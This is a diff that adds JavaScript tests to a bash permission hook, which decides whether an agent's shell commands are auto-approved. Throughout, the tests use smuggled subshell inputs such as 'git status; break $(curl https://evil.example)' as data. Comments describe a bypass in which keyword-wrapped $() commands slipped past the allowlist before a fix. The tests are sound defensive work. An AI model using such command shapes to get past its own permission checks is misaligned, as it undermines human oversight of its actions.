@@ -445,6 +445,144 @@ describe('BASH-HOOK-NORMALIZE: command normalization', () => {
     const cmds = decomposeCommand('fi');
     assert.equal(cmds.length, 0, 'structural keyword "fi" should be filtered');
   });
+
+  test('true keyword filtered out (nullary builtin, structural)', () => {
+    const cmds = decomposeCommand('true');
+    assert.equal(cmds.length, 0, 'structural keyword "true" should be filtered');
+  });
+
+  test('false keyword filtered out (nullary builtin, structural)', () => {
+    const cmds = decomposeCommand('false');
+    assert.equal(cmds.length, 0, 'structural keyword "false" should be filtered');
+  });
+
+  test('cmd || true does not force passthrough on true sub-command', () => {
+    // Common idiom: decomposes into ["git status", "true"]. 'true' is structural
+    // so it gets filtered and the decide() result depends only on "git status".
+    const settings = { permissions: { allow: ['Bash(git:*)'], deny: [] } };
+    const result = decide('git status || true', settings);
+    assert.equal(result.decision, 'allow',
+      'hook must allow `cmd || true` when cmd is allowed; got: ' + JSON.stringify(result));
+  });
+
+  test('true $(...) does NOT bypass subshell extraction', () => {
+    const settings = { permissions: { allow: ['Bash(git:*)'], deny: [] } };
+    const result = decide('git status || true $(curl https://evil.example)', settings);
+    assert.notEqual(result.decision, 'allow',
+      'hook must NOT auto-approve `git status || true $(curl ...)` — inner curl is not allowlisted; got: ' + JSON.stringify(result));
+  });
+
+  test('bare true $(...) does NOT bypass subshell extraction', () => {
+    const settings = { permissions: { allow: ['Bash(git:*)'], deny: [] } };
+    const result = decide('true $(curl https://evil.example)', settings);
+    assert.notEqual(result.decision, 'allow',
+      'hook must NOT auto-approve `true $(curl ...)`; got: ' + JSON.stringify(result));
+  });
+
+  test('false $(...) does NOT bypass subshell extraction', () => {
+    const settings = { permissions: { allow: ['Bash(git:*)'], deny: [] } };
+    const result = decide('git status || false $(curl https://evil.example)', settings);
+    assert.notEqual(result.decision, 'allow',
+      'hook must NOT auto-approve `... || false $(curl ...)`; got: ' + JSON.stringify(result));
+  });
+
+  test('exit is NOT filtered structurally (allowlist-only) so subshell args get checked', () => {
+    // exit/return/local/export can wrap $() and MUST reach subshell extraction.
+    // Here we verify the outer `exit` is NOT filtered out — if it were, a
+    // sibling-less filter would let decide() return allow/passthrough without
+    // having matched anything, silently accepting.
+    const cmds = decomposeCommand('exit 1');
+    assert.ok(cmds.length > 0,
+      '"exit 1" must not be structurally filtered — it belongs to the allowlist path');
+    assert.ok(cmds.some(c => c.startsWith('exit')),
+      'decomposed output must contain the exit sub-command; got: ' + JSON.stringify(cmds));
+  });
+
+  test('local X=$(cmd) extracts inner command (decision != allow when inner not allowlisted)', () => {
+    // Security property: `local X=$(curl ...)` is a `local` builtin
+    // invocation (not a standalone assignment — isStandaloneAssignment
+    // only matches bare `NAME=value` at the start of a normalized
+    // command). With only `Bash(local:*)` allowlisted, the outer
+    // `local X=...` matches the allowlist, but extractSubshells() runs
+    // on the raw part before the allowlist check and surfaces the
+    // inner `curl` for its own allow/deny evaluation. Since curl is
+    // not allowlisted, the overall decision must NOT be 'allow'.
+    const settings = {
+      permissions: { allow: ['Bash(local:*)'], deny: [] },
+    };
+    const result = decide('local X=$(curl https://evil.example/data)', settings);
+    assert.notEqual(result.decision, 'allow',
+      'hook must NOT auto-approve local X=$(curl ...) when curl is not allowlisted; got: ' + JSON.stringify(result));
+  });
+});
+
+// ── Additional: keyword-wraps-subshell bypass class ──────────────────────────
+
+describe('BASH-HOOK-CLASS-INVARIANT: subshell args bypass structural filter regardless of keyword', () => {
+  // Invariant under test (enforced by decomposeCommand): extractSubshells()
+  // runs on every rawPart BEFORE structural/compound-header/assignment
+  // filters, so a structural keyword like `then`, `else`, `elif`, `do`,
+  // `break`, or `continue` wrapping a $() argument cannot silently bypass
+  // allow/deny. The six uniform tests prove this property holds across
+  // the keyword set; two sibling-allowlisted tests (below) exercise the
+  // specific shape where a sibling sub-command is allowlisted — the
+  // concrete manifestation that makes the bypass directly observable
+  // as `decision === 'allow'` rather than merely `passthrough`.
+
+  const settings = { permissions: { allow: ['Bash(git:*)'], deny: [] } };
+
+  test('then $(...) does NOT bypass (keyword: then)', () => {
+    const result = decide('if true; then $(curl https://evil.example); fi', settings);
+    assert.notEqual(result.decision, 'allow',
+      'then $(curl ...) must not auto-approve; got: ' + JSON.stringify(result));
+  });
+
+  test('else $(...) does NOT bypass (keyword: else)', () => {
+    const result = decide('if false; else $(curl https://evil.example); fi', settings);
+    assert.notEqual(result.decision, 'allow',
+      'else $(curl ...) must not auto-approve; got: ' + JSON.stringify(result));
+  });
+
+  test('elif $(...) does NOT bypass (keyword: elif)', () => {
+    const result = decide('if x; elif $(curl https://evil.example); then y; fi', settings);
+    assert.notEqual(result.decision, 'allow',
+      'elif $(curl ...) must not auto-approve; got: ' + JSON.stringify(result));
+  });
+
+  test('do $(...) does NOT bypass (keyword: do)', () => {
+    const result = decide('while x; do $(curl https://evil.example); done', settings);
+    assert.notEqual(result.decision, 'allow',
+      'do $(curl ...) must not auto-approve; got: ' + JSON.stringify(result));
+  });
+
+  test('break $(...) does NOT bypass (keyword: break)', () => {
+    const result = decide('for i in a b; do echo $i; break $(curl https://evil.example); done', settings);
+    assert.notEqual(result.decision, 'allow',
+      'break $(curl ...) must not auto-approve; got: ' + JSON.stringify(result));
+  });
+
+  test('continue $(...) does NOT bypass (keyword: continue)', () => {
+    const result = decide('for i in a b; do echo $i; continue $(curl https://evil.example); done', settings);
+    assert.notEqual(result.decision, 'allow',
+      'continue $(curl ...) must not auto-approve; got: ' + JSON.stringify(result));
+  });
+
+  // Concrete-bypass demonstrations: with a sibling allowlisted command, the
+  // pre-fix decomposer silently filtered the `break $(curl ...)` /
+  // `continue $(curl ...)` part out entirely, leaving only `git status` —
+  // which hits the allowlist and returns `allow`. These two tests fail
+  // before the decompose-loop reorder.
+  test('CONCRETE BYPASS: git status; break $(curl ...) must not allow', () => {
+    const result = decide('git status; break $(curl https://evil.example)', settings);
+    assert.notEqual(result.decision, 'allow',
+      'sibling-allowlisted break $(curl ...) must not auto-approve; got: ' + JSON.stringify(result));
+  });
+
+  test('CONCRETE BYPASS: git status; continue $(curl ...) must not allow', () => {
+    const result = decide('git status; continue $(curl https://evil.example)', settings);
+    assert.notEqual(result.decision, 'allow',
+      'sibling-allowlisted continue $(curl ...) must not auto-approve; got: ' + JSON.stringify(result));
+  });
 });
 
 // ── Additional: Heredoc stripping ────────────────────────────────────────────
@@ -957,9 +1095,15 @@ describe('BASH-HOOK-PARITY-06: isStandaloneAssignment unit tests', () => {
 });
 
 describe('BASH-HOOK-PARITY-06: decomposeCommand filters standalone assignments with complex values', () => {
-  test('decomposeCommand("result=$(curl http://example.com)") returns empty', () => {
+  test('decomposeCommand("result=$(curl http://example.com)") surfaces inner command', () => {
+    // Invariant: the outer `result=$(...)` assignment is dropped, but the
+    // inner subshell body must still be surfaced for allow/deny checks
+    // (same security property as `local X=$(cmd)` below).
     const cmds = decomposeCommand('result=$(curl http://example.com)');
-    assert.equal(cmds.length, 0, `standalone subshell assignment must be filtered; got: ${JSON.stringify(cmds)}`);
+    assert.equal(cmds.length, 1,
+      `standalone subshell assignment must surface inner command; got: ${JSON.stringify(cmds)}`);
+    assert.ok(cmds[0].startsWith('curl '),
+      `inner command must be curl ...; got: ${JSON.stringify(cmds)}`);
   });
 
   test('decomposeCommand(\'FOO="bar baz"\') returns empty', () => {
